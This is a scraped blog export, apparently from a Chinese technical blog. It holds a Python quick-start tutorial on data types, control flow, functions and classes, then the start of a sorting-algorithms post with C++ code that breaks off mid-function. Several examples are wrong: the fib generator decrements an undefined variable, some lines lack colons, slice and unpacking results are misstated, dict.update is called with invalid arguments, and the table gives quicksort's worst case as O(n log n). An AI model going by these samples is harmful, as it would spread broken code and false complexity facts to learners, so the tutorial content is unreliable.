\u0026lt; 2 \u0026lt; 3 # =\u0026gt; True # if 表达式, 同比较元运算符\u0026#34; ? : \u0026#34; \u0026#34;python!\u0026#34; if 0 \u0026gt; 1 else \u0026#34;java!\u0026#34; # =\u0026gt; java! # is 表示是否为同个对象; == 表示值是否相同 a = [1,2,3,4] b = a b is a # =\u0026gt; True b = [1,2,3,4] b is a # =\u0026gt; False b == a # =\u0026gt; True # None 是一个对象, 只能用 is 判断 0 is None # =\u0026gt; False None is None # =\u0026gt; True # None, 0, 空字符串, 空列表, 空字典, 空元组都是 False bool(None) # =\u0026gt; False bool(0) # =\u0026gt; False bool(\u0026#34;\u0026#34;) # =\u0026gt; False bool([]) # =\u0026gt; False bool({}) # =\u0026gt; False bool(()) # =\u0026gt; False 变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 输出, 默认以空行结尾, 使用附加参数可改变结尾 print(\u0026#34;Hello world\u0026#34;, end = \u0026#34;!\u0026#34;) # =\u0026gt; Hello world! # 输入, 返回字符串 input_string_var = input(\u0026#34;Enter some data: \u0026#34;) # 自动数据类型, 不用声明 # 数字类型: 整型, 浮点型, 布尔型, 复数型; 布尔型是整型的子类; 不可变类型 a, b, c, d = 20, 5.5, True, 4+3j # 元组解包赋值 print(type(a), type(b), type(c), type(d)) # =\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; \u0026lt;class \u0026#39;float\u0026#39;\u0026gt; \u0026lt;class \u0026#39;bool\u0026#39;\u0026gt; \u0026lt;class \u0026#39;complex\u0026#39;\u0026gt; # 访问未赋值变量会抛出异常 some_unknown_var # =\u0026gt; NameError 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # 字符串类型 (string), 不可变类型 a = \u0026#34;This is a string\u0026#34; a[5] = \u0026#39;c\u0026#39; # =\u0026gt; TypeError # 字符串可以用单引号或双引号 \u0026#34;这是字符串\u0026#34; \u0026#39;这也是字符串\u0026#39; # 字符串连接 \u0026#34;Hello \u0026#34; + \u0026#34;World!\u0026#34; # =\u0026gt; \u0026#34;Hello World!\u0026#34; \u0026#34;Hello \u0026#34; \u0026#34;python!\u0026#34; # =\u0026gt; \u0026#34;Hello python!\u0026#34; 非变量形式时 # f-srings 格式化字符串, 大括号内可加入任何表达式 (3.6+) name = \u0026#34;python\u0026#34; f\u0026#34;{name} is {len(name)} characters long\u0026#34; # =\u0026gt; python is 6 characters long # .format 格式化字符串, 可使用参数或关键字 \u0026#34;{0} be nimble, {0} be quick, {0} jump over the {1}\u0026#34;.format(\u0026#34;Jack\u0026#34;, \u0026#34;candle stick\u0026#34;) # =\u0026gt; \u0026#34;Jack be nimble, Jack be quick, Jack jump over the candle stick\u0026#34; \u0026#34;{name} wants to eat {food}\u0026#34;.format(name = \u0026#34;Bob\u0026#34;, food = \u0026#34;lasagna\u0026#34;) # =\u0026gt; \u0026#34;Bob wants to eat lasagna\u0026#34; # %s 格式化字符串 (2.5-) \u0026#34;%s can be %s the %s way\u0026#34; % (\u0026#34;strings\u0026#34;, \u0026#34;interpolated\u0026#34;, \u0026#34;old\u0026#34;) # =\u0026gt; strings can be interpolated the old way 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 # 列表类型 (list), 可变类型 li = [] other_li = [4, 5, 6] # 尾插与尾删 li.append(1) # li 为 [1] li.append(2) # li 为 [1, 2] li.append(4) # li 为 [1, 2, 4] li.pop() # li 为 [1, 2] li.append(3) # li 为 [1, 2, 3] li.append(4) # li 为 [1, 2, 3, 4] # 存取同数组, 从 0 开始, -1 表示取尾 li[0] # =\u0026gt; 1 li[-1] # =\u0026gt;4 # 越界存取会抛出异常 li[5] # =\u0026gt; IndexError # 切割 list[begin:end:step], 范围相当于 [begin,end) li[1:3] # =\u0026gt; [2,3] li[2:] # =\u0026gt; [3,4] li[:3] # =\u0026gt; [1, 2, 4] li[::2] # =\u0026gt; [1,4] li[::-1] # =\u0026gt; [4, 3, 2, 1] li2 = li[:] # =\u0026gt; li2为[1, 2, 3, 4] li2 is li # =\u0026gt; False # 删除指定位置元素 del li2[2] # =\u0026gt; li2 为 [1, 2, 4] # 删除匹配的第一个元素, 无匹配时抛出异常 li.remove(2) # =\u0026gt; li 为 [1, 3, 4] li.remove(0) # =\u0026gt; ValueError: 0 is not in the list # 指定位置插入元素 li.insert(1,2) # =\u0026gt; li 为 [1, 2, 3, 4] # 获取匹配的第一个元素的位置, 无匹配时抛出异常 li.index(1) # =\u0026gt; 0 li.index(0) # =\u0026gt; ValueError: 0 is not in the list # 列表相加 li + li_other # =\u0026gt; [1, 2, 3, 4, 4, 5, 6] # 列表拼接 li.extend(li_other) # =\u0026gt; li 变为 [1, 2, 3, 4, 4, 5, 6] # in 判断是否包含值 6 in li_other # =\u0026gt; True # len 获取长度 len(li) # =\u0026gt; 7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # 元组类型 (tuple), 不可变类型 tup = (1, 2, 3) tup[0] # =\u0026gt; 1 tup[0] = 3 # =\u0026gt; TypeError 抛出异常 # 元素数量为1的元组必须要在末尾加逗号 type((1)) # =\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; type((1,)) # =\u0026gt; \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; type(()) # =\u0026gt; \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; # 大部分操作同列表, 更改元素除外 len(tup) # =\u0026gt; 3 tup + (4, 5, 6) # =\u0026gt; (1, 2, 3, 4, 5, 6) tup[:2] # =\u0026gt; (1, 2) 2 in tup # =\u0026gt; true # 元组解包赋值 a, b, c = (1, 2, 3) # a 为 1, b 为 2, c 为 3 # 扩展解包 a, *b, c = (1, 2, 3, 4) # a 为 1, b 为 [2, 3], c 为 3 # 元组括号可省略 d, e, f = 4, 5, 6 # 交换变量值 e, d = d, e # d 为 5, e 为 4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # 字典类型 (dictionary), 可变类型, 存储 key 和 value 的映射关系 empty_dict = {} filled_dict = {\u0026#34;one\u0026#34;: 1, \u0026#34;two\u0026#34;: 2, \u0026#34;three\u0026#34;: 3} # key 必须为不可变类型且无重复值, 为确保 key 被转换为唯一的 hash-value 以用于快速查询 invalid_dict = {[1, 2, 3]: \u0026#34;123\u0026#34;} # =\u0026gt; TypeError: unhashable type \u0026#39;list\u0026#39; 抛出异常 valid_dict = {(1, 2, 3): [1, 2, 3]} # =\u0026gt; value 可为任何类型 # in 只能判断字典中是否包含 key \u0026#34;one\u0026#34; in filled_dict # =\u0026gt; True 1 in filled_dict # =\u0026gt; False # [key] 取值, key 不存在时抛出异常 filled_dict[\u0026#34;one\u0026#34;] # =\u0026gt; 1 filled_dict[\u0026#34;four\u0026#34;] # =\u0026gt; KeyError # 用 .get(key) 避免异常, 不存在时返回默认值, 无默认值时返回 None filled_dict.get(\u0026#34;one\u0026#34;, 4) # =\u0026gt; 1 filled_dict.get(\u0026#34;four\u0026#34;, 4) # =\u0026gt; 4 filled_dict.get(\u0026#34;four\u0026#34;) # =\u0026gt; None # 用 .keys() 获取所有 key, 用 .values() 获取所有 value # 返回可迭代对象, 需要包含在 list() 中以转换为列表 # (3.7-) 无序, (3.7+) 按照插入顺序 list(filled_dict.keys()) # =\u0026gt; [\u0026#34;one\u0026#34;, \u0026#34;two\u0026#34;, \u0026#34;three\u0026#34;] (3.7+) list(filled_dict.values()) # =\u0026gt; [1, 2, 3] (3.7+) # .setdefault() 在 key 不存在时插入新项 filled_dict.setdefault(\u0026#34;four\u0026#34;, 5) # =\u0026gt; \u0026#34;four\u0026#34;: 5 filled_dict.setdefault(\u0026#34;four\u0026#34;, 4) # =\u0026gt; \u0026#34;four\u0026#34;: 5 # 用 .update(key, value) 赋值 filled_dict.update(\u0026#34;four\u0026#34;, 4) filled_dict[\u0026#34;five\u0026#34;] = 5 # 另一种赋值方法 # del 删除项 del filled_dict[\u0026#34;five\u0026#34;] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 集合类型 (set), 可变类型, 元素必须为不可变类型, 元素不会重复 empty_set = set() some_set = {1, 1, 2, 2, 3, 4} # some_set 为 {1, 2, 3, 4} invalid_set = {[1], 1} # =\u0026gt; TypeError: unhashable type \u0026#39;list\u0026#39; 抛出异常 # 集合运算 other_set = {3, 4, 5, 6} some_set \u0026amp; other_set # =\u0026gt; {3, 4, 5} 取交集 some_set | other_set # =\u0026gt; {1, 2, 3, 4, 5, 6} 取并集 some_set - other_set # =\u0026gt; {1, 2} 取差集 some_set ^ other_set # =\u0026gt; {1, 2, 5, 6} 取对称差集 # 用 .add() 添加元素 some_set.add(5) # 用 .discard 删除元素 some_set.discard(5) some_set.discard(6) # =\u0026gt; 不会抛出异常 # 用 .copy() 复制集合 filled_set = some_set.copy() filled_set is some_set # =\u0026gt; False # in 判断元素是否在集合内 5 in some_set # =\u0026gt; False 流程控制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # if 判断 some_var = 5 if some_var \u0026gt; 10: print(\u0026#34;some_var is bigger than 10.\u0026#34;) # 4个空格缩进 elif some_var \u0026lt; 10: print(\u0026#34;some_var is smaller than 10.\u0026#34;) else: print(\u0026#34;some_var is indeed 10.\u0026#34;) # for 循环 for animal in [\u0026#34;dog\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;mouse\u0026#34;]: print(\u0026#34;{} is a mammal\u0026#34;.format(animal)) for i in range(4) # 遍历 0, 1, 2, 3 for i in range(4, 8) # 遍历 4, 5, 6, 7 for i in range(4, 8, 2) # 遍历 4, 6 animals = [\u0026#34;dog\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;mouse\u0026#34;] for i, value in enumerate(animals): print(i, value, end = \u0026#34;, \u0026#34;) # =\u0026gt; 0 dog, 1 cat, 2 mouse, # while 循环 x = 0 while x \u0026lt; 4: print(x) x += 1 # 异常处理 try: raise IndexError(\u0026#34;This is an index error\u0026#34;) except IndexError as e: pass # 此处应处理错误 except (TypeError, NameError): pass # 可同时处理不同类错误 else: print(\u0026#34;All good!\u0026#34;) finally: print(\u0026#34;We can clean up resources here.\u0026#34;) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 contents = {\u0026#34;aa\u0026#34;: 12, \u0026#34;bb\u0026#34;: 21} with open(\u0026#34;file1.txt\u0026#34;, \u0026#34;w+\u0026#34;) as file: file.write(str(contents)) # 字符串写入文件 with open(\u0026#34;file2.txt\u0026#34;, \u0026#34;w+\u0026#34;) as file: file.write(json.dumps(contents)) # 对象写入文件 with open(\u0026#34;file1.txt\u0026#34;, \u0026#34;r+\u0026#34;) as file: contents = file.read() # 读取文件字符串 print(contents) with open(\u0026#34;file2.txt\u0026#34;, \u0026#34;r+\u0026#34;) as file: contents = json.load(file) # 读取文件对象 print(contents) # windows 调用 open() 默认为 ANSI # 读写 utf-8 需指定 encoding = \u0026#34;utf-8\u0026#34; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # 可迭代对象 (iterable) : 可遍历, 但不能随机访问, 可以生成迭代器 filled_dict = {\u0026#34;one\u0026#34;: 1, \u0026#34;two\u0026#34;: 2, \u0026#34;three\u0026#34;: 3} our_iterable = filled_dict.keys() print(our_iterable) for i in our_iterable: # 遍历可迭代对象 print(i) our_iterable[1] # TypeError 抛出异常 our_iterator = iter(our_iterable) # 生成迭代器 # 迭代器 (iterator) 可以记住遍历位置对象 print(next(our_iterator)) # =\u0026gt; one print(next(our_iterator)) # =\u0026gt; two print(next(our_iterator)) # =\u0026gt; three print(next(our_iterator)) # =\u0026gt; StopIteration # for 内部实现了迭代 our_iterator = iter(our_iterable) for i in our_iterator: print(i) # 可用 list 一次性取出可迭代对象或迭代器所有元素 list(filled_dict.keys()) # =\u0026gt; [\u0026#34;one\u0026#34;, \u0026#34;two\u0026#34;, \u0026#34;three\u0026#34;] list(our_iterator) # =\u0026gt; [] # 生成器 (generator), 实现惰性运算, 只有在需要时计算下一个值 values = (-x for x in [1, 2, 3, 4, 5]) gen_to_list = list(values) print(gen_to_list) # =\u0026gt; [-1, -2, -3, -4, -5] # 生成器函数中 yield 返回并暂停迭代 def fib(n): prev, curr = 0, 1 while n \u0026gt; 0 max -= 1 yield curr prev, curr = curr, prev + curr 函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 # def 定义函数 def add(x, y): print(\u0026#34;x is {} and y is {}.\u0026#34;.format(x, y)) return x + y add(5, 6) add(y = 6, x = 5) # 关键词参数可为任意顺序 # 可变参数函数 def varargs(*args): # * 展开元组 return args varargs(1, 2, 3) # =\u0026gt; (1, 2, 3) def keyword_args(**kwargs): # ** 展开字典 return kwargs keyword_args(big = 1, small = 0) # =\u0026gt; {\u0026#34;big\u0026#34;: 1, \u0026#34;small\u0026#34;: 0} def all_args(*args, **kwargs): # 混用参数 print(args, end = \u0026#34;, \u0026#34;) print(kwargs) args = (1, 2, 3, 4) kwargs = {\u0026#34;a\u0026#34;: 1, \u0026#34;b\u0026#34;: 2, \u0026#34;c\u0026#34;: 3} all_args(*args) # =\u0026gt; (1, 2, 3, 4), {} all_args(**kwargs) # =\u0026gt; (), {\u0026#34;a\u0026#34;: 1, \u0026#34;b\u0026#34;: 2, \u0026#34;c\u0026#34;: 3} all_args(*args,**kwargs) # =\u0026gt; (1, 2, 3, 4), {\u0026#34;a\u0026#34;: 1, \u0026#34;b\u0026#34;: 2, \u0026#34;c\u0026#34;: 3} # 返回元组 def swap(x, y): return y, x x, y = 1, 2 x, y = swap(x, y) # =\u0026gt; x = 2, y = 1 # 函数作用域 x = 5 def set_x(num): x = num def set_global_x(num): global x x = num set_x(0) print(x) # =\u0026gt; 5 set_global_x(1) print(x) # =\u0026gt; 1 # 函数是 \u0026#34;一等公民\u0026#34; def create_adder(x): def adder(y): return x + y return adder add_10 = create_adder(10) add_10(3) # =\u0026gt; 13 # 匿名函数 func1 = lambda x: x \u0026gt; 2 func2 = lambda x, y: x ** 2 + y ** 2 func1(3) # =\u0026gt; True func2(2, 1) # =\u0026gt; 5 # 高阶函数: map 映射, filter 过滤 list(map(add_10, [1, 2, 3])) # =\u0026gt; [11, 12, 13] list(map(max, [1, 2, 3], [4, 2, 1])) # =\u0026gt; [4, 2, 3] list(filter(lambda x: x \u0026gt; 5, [3, 4, 5, 6, 7])) # =\u0026gt; [6, 7] # 推导式: 列表, 字典, 集合 [add_10(i) for i in [1, 2, 3]] # =\u0026gt; [11, 12, 13] [x for x in [3, 4, 5, 6, 7] if x \u0026gt; 5] # =\u0026gt; [6, 7] {x for x in \u0026#39;abcddeef\u0026#39; if x not in \u0026#39;abc\u0026#39;} # =\u0026gt; {\u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;} {x: x ** 2 for x in range(5)} # =\u0026gt; {0: 0, 1: 1, 2: 4, 3: 9, 4: 16} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 模块本质为python文件 # 导入模块 import math math.sqrt(16) # =\u0026gt; 4.0 # 导入模块中的具体函数 from math import ceil, floor ceil(3.9) # =\u0026gt; 4.0 floor(3.9) # =\u0026gt; 3.0 # 模块名称简化 import math as m m.sqrt(16) # =\u0026gt; 4.0 # 查看模块中的函数和字段 import math dir(math) # 模块重名时, 本地文件优先级高于内建库 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # 函数闭包: 返回的子函数调用外层函数变量 def outer(x) def inner(y): return x + y return inner # 装饰器: 利用函数闭包思路, 在不改变原函数下添加新功能 from functools import wraps def beg(target_function): @wraps(target_function) def wrapper(*args, **kwargs): msg, say_please = target_function(*args, **kwargs) if say_please: return \u0026#34;{} {}\u0026#34;.format(msg, \u0026#39;Please! I am poor :(\u0026#39;) return msg return wrapper @beg def say(say_please = False): msg = \u0026#39;Can you buy me a cup of coffee?\u0026#39; return msg, say_please print(say()) # =\u0026gt; \u0026#34;Can you buy me a cup of coffee?\u0026#34; print(say(say_please = True)) # =\u0026gt; \u0026#34;Can you buy me a cup of coffee? Please! I am poor :(\u0026#34; 类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 class Human: # 公共属性 height = 0 # 私有属性 __species = \u0026#39;H. sapiens\u0026#39; # 特殊方法: __init__, __del__, __repr__ 等 def __init__(self, name): # 参数赋值给实例的 name 字段 self.name = name # 初始化属性 self._age = 0 # 实例方法, 第一个参数总是self, 即实例对象 def say(self, msg): print(\u0026#34;{name}: {message}\u0026#34;.format(name = self.name, message = msg)) # 私有方法 def __sing(self): return \u0026#39;yo, yo, check it out...\u0026#39; # 类方法, 被所有此类实例共用 @classmethod def get_height(b): return b.height @classmethod def get_species(a): return a.__species # 静态方法, 没有实例或类的绑定 @staticmethod def grunt(): return \u0026#39;*grunt*\u0026#39; # 同名只读属性 @property def age(self): return self._age # 允许属性被修改 @age.setter def age(self, age): self._age = age # 允许属性被删除 @age.deleter def age(self): del self._age # 重载运算符方法: __add__, __sub__, __mul__, __mod__ 等 # 代码块指挥在模块为主程序时被执行 if __name__ == \u0026#39;__main__\u0026#39; # 定义实例 i = Human(name=\u0026#34;Ian\u0026#34;) i.say(\u0026#34;hi\u0026#34;) # =\u0026gt; \u0026#34;Ian: hi\u0026#34; # 调用类方法 i.say(i.get_species()) # =\u0026gt; \u0026#34;Ian: H. sapiens\u0026#34; i.say(i.get_height()) # =\u0026gt; \u0026#34;Ian: 0\u0026#34; # 修改类属性 Human.height = 170 # =\u0026gt; 公有属性可以外部修改 i.say(i.get_height()) # =\u0026gt; \u0026#34;Ian: 170\u0026#34; Human.__species = \u0026#39;cat\u0026#39; # =\u0026gt; 私有属性不会被外部修改 i.say(i.get_species()) # =\u0026gt; \u0026#34;Ian: H. sapiens\u0026#34; # 静态方法 print(Human.grunt()) # =\u0026gt; \u0026#34;*grunt*\u0026#34; print(i.grunt()) # =\u0026gt; \u0026#34;*grunt*\u0026#34; # 更新实例属性 i.age = 24 i.say(i.age) # =\u0026gt; \u0026#34;Ian: 24\u0026#34; del i.age # =\u0026gt; AttributeError, 抛出异常 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 # 上述代码存在 human.py 中 from human import Human # 子类 (继承): 私有对象不能被继承(调用/重载) class Superhero(Human): # 重载父类公有属性 height = 2000 # 重载构造方法 def __init__(self, name, movie = False, superpowers = [\u0026#34;super strength\u0026#34;, \u0026#34;bulletproofing\u0026#34;]): self.fictional = True self.movie = movie self.superpowers = superpowers # 调用父类的构造方法 super().__init__(name) # 新增方法 def boast(self): for power in self.superpowers: print(\u0026#34;I wield the power of {pow}!\u0026#34;.format(pow=power)) if __name__ == \u0026#39;__main__\u0026#39;: sup = Superhero(name = \u0026#39;Tick\u0026#39;) if isinstance(sup, Human): # =\u0026gt; True print(\u0026#34;I am human\u0026#34;) if type(sup) is Superhero: # =\u0026gt; True print(\u0026#34;I am superhero\u0026#34;) # 获取方法解析顺序 print(Superhero.__mro__) # =\u0026gt; (\u0026lt;class \u0026#39;__main__.Superhero\u0026#39;\u0026gt;, # =\u0026gt; \u0026lt;class \u0026#39;human.Human\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;object\u0026#39;\u0026gt;) # 继承属性 sup.age = 30 print(sup.age) # =\u0026gt; 30 # 子类独有属性 print(\u0026#34;Am I Oscar eligible?\u0026#34; + str(sup.movie)) # 父类方法子类属性 print(sup.get_height) # =\u0026gt; 2000 # 子类独有方法 sup.boast() # =\u0026gt; I wield the power of super strength! # =\u0026gt; I wield the power of bulletproofing! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 # 上述代码存在 superhero.py 中 from superhero import Superhero # 定义另一个父类 class Bat: __species = \u0026#39;Baty\u0026#39; # 同样有 height 属性 heigt = 20 def __init__(self, can_fly = True): self.fly = can_fly # 同样有 say 方法 def say(self, msg): msg = \u0026#39;... ... ...\u0026#39; return msg def sonar(self): return \u0026#39;))) ... (((\u0026#39; # 多继承 class Batman(Superhero, Bat): def __init__(self, *args, **kwargs): Superhero.__init__(self, \u0026#39;anoymous\u0026#39;, movie = True, superpowers = [\u0026#39;Wealthy\u0026#39;], *args, **kwargs) Bat.__init__(self, *args, can_fly = False, **kwargs) self.name = \u0026#39;Sad Affleck\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: sup = Batman() print(Batman.__mro__) # =\u0026gt; (\u0026lt;class \u0026#39;__main__.Batman\u0026#39;\u0026gt;, # =\u0026gt; \u0026lt;class \u0026#39;superhero.Superhero\u0026#39;\u0026gt;, # =\u0026gt; \u0026lt;class \u0026#39;human.Human\u0026#39;\u0026gt;, # =\u0026gt; \u0026lt;class \u0026#39;bat.Bat\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;object\u0026#39;\u0026gt;) # 属性/方法重复时, 顺序继承 print(sup.get_height()) # =\u0026gt; 2000 sup.say(\u0026#39;I agree\u0026#39;) # =\u0026gt; \u0026#34;Sad Affleck: I agree\u0026#34; print(sup.sonar()) # =\u0026gt; \u0026#34;))) ... (((\u0026#34; sup.age = 100 print(sup.age) # =\u0026gt; 100 # 继承属性重载 print(\u0026#39;Can I fly? \u0026#39; + str(sup.fly)) # =\u0026gt; Can I fly? False ","date":"2023-10-14T00:00:00Z","permalink":"https://example.com/p/python%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"python快速入门"},{"content":"排序 稳定是指关键字相同的记录在排序后保持原有相对次序不变, 只有在原有相对次序有意义时需要考虑.\n排序算法 平均时间复杂度 最好时间复杂度 最坏时间复杂度 空间复杂度 稳定性 冒泡排序 $O(n^2)$ $O(n)$ $O(n^2)$ $O(1)$ 稳定 快速排序 $O(n\\log(n))$ $O(n\\log(n))$ $O(n\\log(n))$ $O(\\log(n))$ 不稳定 选择排序 $O(n^2)$ $O(n^2)$ $O(n^2)$ $O(1)$ 不稳定 堆排序 $O(n\\log(n))$ $O(n\\log(n))$ $O(n\\log(n))$ $O(1)$ 不稳定 插入排序 $O(n^2)$ $O(n)$ $O(n^2)$ $O(1)$ 稳定 希尔排序 $O(n\\log(n))$ $O(n^{1.3})$ $O(n^2)$ $O(1)$ 不稳定 归并排序 $O(n\\log(n))$ $O(n\\log(n))$ $O(n\\log(n))$ $O(n)$ 稳定 计数排序 $O(n+k)$ $O(n+k)$ $O(n+k)$ $O(k)$ 稳定 桶排序 $O(n+k)$ $O(n+k)$ $O(n^2)$ $O(n+k)$ 稳定 基数排序 $O(nm)$ $O(nm)$ $O(nm)$ $O(n+m)$ 稳定 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;vector\u0026gt; using namespace std; // 数列最大值 template\u0026lt;typename Type\u0026gt; static Type maximal(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { Type max = arr[0]; for (int i = 1; i \u0026lt;= arr.size() - 1; ++i) { if (arr[i] \u0026gt; max) max = arr[i]; } return max; } // 数列最小值 template\u0026lt;typename Type\u0026gt; static Type minimal(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { Type min = arr[0]; for (int i = 1; i \u0026lt;= arr.size() - 1; ++i) { if (arr[i] \u0026lt; min) min = arr[i]; } return min; } 冒泡排序 每轮遍历时两两比较并交换.\n1 2 3 4 5 6 7 8 9 10 11 12 13 template\u0026lt;typename Type\u0026gt; static void bubble(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { for (int i = 0; i \u0026lt; arr.size() - 1; ++i) { bool isSwapped = false; // 记录交换情况 for (int j = 0; j \u0026lt; arr.size() - 1 - i; ++j){ if (arr[j] \u0026gt; arr[j + 1]){ // 若条件改为\u0026#34;\u0026gt;=\u0026#34;则不再稳定 swap(arr[j], arr[j + 1]); isSwapped = true; } } if(!isSwapped) break; // 本轮没有交换说明已经有序 } } 快速排序(双路) 快速排序本质为比较交换排序. 分区中随机选择一个基准, 所有小于基准值的放在基准一侧, 大于基准值的放在另一侧, 退出时, 基准位于中间位置, 递归操作.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;random\u0026gt; template\u0026lt;typename Type\u0026gt; static void quickRecur(vector\u0026lt;Type\u0026gt;\u0026amp; arr, int left, int right){ if (left \u0026gt;= right) return; random_device seed; ranlux48 engine(seed()); uniform_int_distribution\u0026lt;\u0026gt; distrib(left,right); Type flag = arr[distrib(engine)]; int head = left - 1, tail = right + 1; while (head \u0026lt; tail) { do head++; while(arr[head] \u0026lt; flag); do tail--; while(arr[tail] \u0026gt; flag); if (head \u0026lt; tail) swap(arr[head], arr[tail]); } quickRecur(arr, left, tail); quickRecur(arr, tail+1, right); } template\u0026lt;typename Type\u0026gt; static void quick(vector\u0026lt;Type\u0026gt;\u0026amp; arr){ quickRecur(arr, 0, arr.size()-1); } 在重复值较多的场景下, 可以额外划分出一个区域将与基准值相等的元素聚集在基准值前后实现三路. sort()方法以快速排序为主, 辅以插入排序和堆排序.\n选择排序 遍历过程中依次选出末尾序列中的最值元素放到序列起始位置.\n1 2 3 4 5 6 7 8 9 10 11 12 template\u0026lt;typename Type\u0026gt; static void selection(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { for (int i = 0; i \u0026lt; arr.size() - 1; ++i) { int min = i; for (int j = i + 1; j \u0026lt; arr.size(); ++j) { if (arr[j] \u0026lt; arr[min]) { min = j; } } // 选出末尾序列中最小值 swap(arr[i], arr[min]); // 交换到序列起始位置 } } 堆排序 堆排序本质为选择最值排序. 堆是一个完全二叉树, 大根堆指父节点值总大于(等于)子节点值, 小根堆指父节点值总小于(等于)子节点值. 以升序为例, 创建大根堆, 交换根(当前最大值)到叶末尾, 固定叶末尾, 其余部分变为大根堆(找出下一个最大值), 重复操作直至所有元素固定.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 template\u0026lt;typename Type\u0026gt; static void push(vector\u0026lt;Type\u0026gt;\u0026amp; arr, int start, int end) { int dad = start, son = dad * 2 + 1; // 父节点和左子节点, 右子节点为\u0026#34;dad * 2 + 2\u0026#34; while (son \u0026lt;= end) { if ((son + 1 \u0026lt;= end) \u0026amp;\u0026amp; arr[son] \u0026lt; arr[son + 1]) ++son; // 选出子结点中较大的 if (arr[dad] \u0026gt; arr[son]) return; // 父节点大于子节点, 已为大根堆 else { swap(arr[dad], arr[son]); // 父节点小于等于子节点时, 互换 dad = son; son = dad * 2 + 1; // 再依次将子堆调整为大根堆 } } } template\u0026lt;typename Type\u0026gt; static void heap(vector\u0026lt;Type\u0026gt;\u0026amp; arr){ int size = arr.size(); for (int i = size / 2 - 1; i \u0026gt;= 0; --i) { push(arr, i, size-1); } // 构造大根堆 for (int i = size - 1; i \u0026gt; 0; --i) { swap(arr[0], arr[i]); // 交换当前末尾和根 push(arr, 0, i-1); // 固定好的末尾以外部分调整为大根堆 } } 插入排序 遍历时将当前元素插入到前面队列的相应位置, 该位置及其后的元素依次后移.\n1 2 3 4 5 6 7 8 9 10 11 static void insertion(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { for (int i = 1; i \u0026lt; arr.size(); ++i) { Type flag = arr[i]; // 记录当前元素 int j = i - 1; while ((j \u0026gt;= 0) \u0026amp;\u0026amp; (flag \u0026lt; arr[j])){ arr[j + 1] = arr[j]; --j; } // 找到位置时, 元素依次后移 arr[j + 1] = flag; } } 希尔排序 分割为若干子序列进行插入排序, 子序列有序后, 再合并进行插入排序, 循环操作.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 template\u0026lt;typename Type\u0026gt; static void shell(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { int gap = 1; while (gap \u0026lt; arr.size() / 3){ gap = 3 * gap + 1; } // 子序列分割数 while (gap) { // 以gap为间隔的子序列分别进行插入排序 for (int i = gap; i \u0026lt; arr.size(); ++i) { for (int j = i; (j \u0026gt;= gap) \u0026amp;\u0026amp; (arr[j] \u0026lt; arr[j - gap]); j -= gap) { swap(arr[j], arr[j - gap]); } } gap /= 3; } } 归并排序 临时空间存储两个有序序列之和用来存放合并排序后的序列, 依次比较两个有序序列元素并存入临时空间, 重复上述操作.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 template\u0026lt;typename Type\u0026gt; static void mergeRecur(vector\u0026lt;Type\u0026gt;\u0026amp; arr, int start, int end) { if (start \u0026gt;= end) return; int mid = ((end - start) \u0026gt;\u0026gt; 1) + start; mergeRecur(arr, start, mid); // 左有序序列 mergeRecur(arr, mid + 1, end); // 右有序序列 static vector\u0026lt;Type\u0026gt; tmp; tmp.clear(); int left = start, right = mid + 1; // 